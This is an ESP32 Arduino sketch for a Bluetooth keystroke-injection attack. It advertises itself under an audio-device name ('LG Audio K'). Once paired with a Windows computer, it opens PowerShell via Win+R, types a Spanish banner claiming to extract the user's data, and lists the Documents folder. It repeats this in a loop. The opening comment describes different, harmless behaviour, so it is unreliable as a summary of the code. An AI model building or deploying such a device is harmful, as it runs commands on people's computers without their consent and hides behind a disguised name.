/**
 * This example turns the ESP32 into a Bluetooth LE keyboard that writes the words, presses Enter, presses a media key and then Ctrl+Alt+Delete
 */
#include <BleKeyboard.h>

BleKeyboard bleKeyboard("LG Audio K");
static int runned=0;
void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE work!");
  bleKeyboard.begin();
  delay(5000);
  Serial.println("Starting...");

}




void press_special_char(char letter){
   
  bleKeyboard.press(KEY_LEFT_ALT);
  bleKeyboard.write(KEY_NUM_0);
   if (letter == '-') {
        
        bleKeyboard.write(KEY_NUM_4);
        bleKeyboard.write(KEY_NUM_5);
        
   }
   else if(letter == '\''){
        
        bleKeyboard.write(KEY_NUM_3);
        bleKeyboard.write(KEY_NUM_9);
   }
   else if(letter == '$'){
        
        bleKeyboard.write(KEY_NUM_3);
        bleKeyboard.write(KEY_NUM_6);
   }
   else if(letter == ':'){
        
        bleKeyboard.write(KEY_NUM_5);
        bleKeyboard.write(KEY_NUM_8);
   }
   else if(letter == '\\'){
        
        bleKeyboard.write(KEY_NUM_9);
        bleKeyboard.write(KEY_NUM_2);
   }

   bleKeyboard.releaseAll();
}

void runcommand(char* command){
  for (int i = 0; i <= strlen(command); i++) {
        char letter = command[i];
        int ascii_value = command[i];
        
        if (ascii_value>=33 && ascii_value <= 47) {
          press_special_char(letter);
        
        } else {
          bleKeyboard.write(command[i]);
        }

        delay(10);
      }
}

void start(){
  
  if (bleKeyboard.isConnected()) {
    Serial.println("Connecting...");
    
    bleKeyboard.press(KEY_RIGHT_GUI);
    bleKeyboard.press('r');
    bleKeyboard.releaseAll();
    delay(1000);
    bleKeyboard.print("powershell.exe");
    Serial.println(">> ENTER");
    bleKeyboard.write(KEY_RETURN);
    delay(1000);
    Serial.println(">> Opening Powershell....");
    char cmd_echo[] = "write-host -foregroundcolor red 'Hola esto es una prueba que me conecte a tu dispositivo, te estoy extrallendo tu informacion'";
    char cmd[] = "Get-ChildItem $ENV:USERPROFILE\Documents";
    runcommand(cmd_echo);
    bleKeyboard.write(KEY_RETURN);
    delay(1000);
    runcommand(cmd);
    bleKeyboard.write(KEY_RETURN);
    delay(10);
    Serial.println(">> End....");
    bleKeyboard.releaseAll();
   delay(50000);
  }
  else{
  //  start();
  }

}

void loop() {
  delay(5000);
  start();
  
}
